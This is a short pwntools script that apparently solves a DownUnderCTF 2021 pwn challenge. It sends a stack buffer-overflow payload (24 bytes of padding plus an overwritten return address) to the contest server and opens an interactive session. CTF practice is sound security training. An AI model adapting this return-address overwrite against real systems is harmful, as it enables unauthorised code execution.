from pwn import *

io = remote('pwn-2021.duc.tf', 31921)
print(io.recv())
payload = b'A'*24+p64(0x00000000004011d7+1) 
io.sendline(payload)
io.interactive()
